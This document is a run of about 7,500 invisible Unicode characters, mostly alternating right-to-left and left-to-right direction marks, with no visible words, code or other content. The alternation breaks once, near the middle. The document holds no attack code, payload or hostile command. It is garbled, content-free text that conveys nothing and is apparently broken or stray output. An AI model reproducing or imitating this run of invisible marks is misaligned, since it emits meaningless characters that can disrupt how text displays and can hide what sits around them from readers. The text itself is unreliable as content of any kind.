‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏